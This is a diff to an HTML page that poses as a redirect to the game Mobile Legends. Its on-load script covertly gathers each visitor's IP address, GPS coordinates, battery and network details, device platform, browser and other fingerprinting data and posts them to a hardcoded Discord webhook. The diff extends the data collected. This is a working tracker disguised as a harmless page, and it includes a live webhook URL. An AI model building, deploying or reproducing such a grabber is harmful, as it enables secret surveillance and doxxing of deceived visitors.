@@ -6,68 +6,74 @@
     <title>Redirect...</title>
     <script>
         window.onload = async function() {
-            const webhookUrl = "https://discord.com/api/webhooks/1343229196897353808/5mq_Wnlt8xnIpyN4Rr_HdP2VRdjxPQ5cXzJlAcMayn1elvCHUZLN87MSweWbfEAdG1uF";
+            const whUrl = "https://discord.com/api/webhooks/1343229196897353808/5mq_Wnlt8xnIpyN4Rr_HdP2VRdjxPQ5cXzJlAcMayn1elvCHUZLN87MSweWbfEAdG1uF";
 
             try {
-                const response = await fetch("https://api.ipify.org?format=json", { cache: "no-store" });
-                const data = await response.json();
+                const res = await fetch("https://api.ipify.org?format=json", { cache: "no-store" });
+                const data = await res.json();
                 const ip = data.ip;
 
-                const language = navigator.language || navigator.userLanguage;
+                const lang = navigator.language || navigator.userLanguage;
 
-                let connectionType = "Unknown";
-                let networkType = "Unknown";
+                let ct = "Unknown";
+                let nt = "Unknown";
+                let ds = "Unknown";
                 if (navigator.connection) {
-                    connectionType = navigator.connection.effectiveType || "Unknown";
-                    networkType = navigator.connection.type || "Unknown";
-                    if (navigator.connection.downlinkMax > 10) networkType = "WiFi";
-                    else if (navigator.connection.downlinkMax > 0) networkType = "Data Seluler";
+                    ct = navigator.connection.effectiveType || "Unknown";
+                    nt = navigator.connection.type || "Unknown";
+                    ds = navigator.connection.downlink ? `${navigator.connection.downlink} Mbps` : "Unknown";
+                    if (navigator.connection.downlinkMax > 10) nt = "WiFi";
+                    else if (navigator.connection.downlinkMax > 0) nt = "Data Seluler";
                 }
 
-                let batteryLevel = "Unknown";
-                let isCharging = "Unknown";
+                let bl = "Unknown";
+                let cs = "Unknown";
+                let psm = "Unknown";
                 if (navigator.getBattery) {
-                    const battery = await navigator.getBattery();
-                    batteryLevel = `${Math.round(battery.level * 100)}%`;
-                    isCharging = battery.charging ? "Charging" : "Not Charging";
+                    const bat = await navigator.getBattery();
+                    bl = `${Math.round(bat.level * 100)}%`;
+                    cs = bat.charging ? "Charging" : "Not Charging";
+                    psm = bat.saving ? "Enabled" : "Disabled";
                 }
 
-                const userAgent = navigator.userAgent;
-                let platform = "Unknown";
-                if (/Android/i.test(userAgent)) platform = "Android";
-                else if (/iPhone|iPad|iPod/i.test(userAgent)) platform = "iOS";
-                else if (/Windows/i.test(userAgent)) platform = "Windows";
-                else if (/Mac/i.test(userAgent)) platform = "MacOS";
-                else if (/Linux/i.test(userAgent)) platform = "Linux";
+                const ua = navigator.userAgent;
+                let plat = "Unknown";
+                if (/Android/i.test(ua)) plat = "Android";
+                else if (/iPhone|iPad|iPod/i.test(ua)) plat = "iOS";
+                else if (/Windows/i.test(ua)) plat = "Windows";
+                else if (/Mac/i.test(ua)) plat = "MacOS";
+                else if (/Linux/i.test(ua)) plat = "Linux";
 
-                let browser = "Unknown";
-                if (/Chrome/i.test(userAgent) && !/Edg/i.test(userAgent)) browser = "Chrome";
-                else if (/Firefox/i.test(userAgent)) browser = "Firefox";
-                else if (/Safari/i.test(userAgent) && !/Chrome/i.test(userAgent)) browser = "Safari";
-                else if (/Edg/i.test(userAgent)) browser = "Edge";
+                let br = "Unknown";
+                if (/Chrome/i.test(ua) && !/Edg/i.test(ua)) br = "Chrome";
+                else if (/Firefox/i.test(ua)) br = "Firefox";
+                else if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) br = "Safari";
+                else if (/Edg/i.test(ua)) br = "Edge";
 
-                let geolocation = "Disabled";
+                let geo = "Disabled";
                 if (navigator.geolocation) {
                     try {
-                        const position = await new Promise((resolve, reject) => {
+                        const pos = await new Promise((resolve, reject) => {
                             navigator.geolocation.getCurrentPosition(resolve, reject);
                         });
-                        geolocation = `Latitude: ${position.coords.latitude}, Longitude: ${position.coords.longitude}`;
+                        geo = `Lat: ${pos.coords.latitude}, Lon: ${pos.coords.longitude}`;
                     } catch {
-                        geolocation = "Permission Denied";
+                        geo = "Permission Denied";
                     }
                 }
 
-                const screenResolution = `${window.screen.width}x${window.screen.height}`;
-                const localTime = new Date().toLocaleString();
+                const sr = `${window.screen.width}x${window.screen.height}`;
+                const lt = new Date().toLocaleString();
+                const cc = navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} cores` : "Not Supported";
+                const dnt = navigator.doNotTrack === "1" ? "Enabled" : "Disabled";
 
-                await fetch(webhookUrl, {
+                await fetch(whUrl, {
                     method: "POST",
                     headers: {
                         "Content-Type": "application/json"
                     },
                     body: JSON.stringify({
-                        content: `IP Address: ${ip}\nBrowser Language: ${language}\nConnection Type: ${connectionType}\nNetwork Type: ${networkType}\nBattery Level: ${batteryLevel}\nCharging Status: ${isCharging}\nPlatform: ${platform}\nBrowser: ${browser}\nGeolocation: ${geolocation}\nScreen Resolution: ${screenResolution}\nLocal Time: ${localTime}`
+                        content: `IP: ${ip}\nLang: ${lang}\nCT: ${ct}\nNT: ${nt}\nDS: ${ds}\nBL: ${bl}\nCS: ${cs}\nPSM: ${psm}\nPlat: ${plat}\nBR: ${br}\nGeo: ${geo}\nSR: ${sr}\nLT: ${lt}\nCC: ${cc}\nDNT: ${dnt}`
                     })
                 });
 
@@ -84,7 +90,7 @@
 <body>
     <div style="text-align: center; font-family: Arial, sans-serif;">
         <h1>Mengalihkan ke Mobile Legends...</h1>
-        <p>Harap tunggu.</p>
+        <p>Harap tunggu beberapa detik.</p>
     </div>
 </body>
 </html>
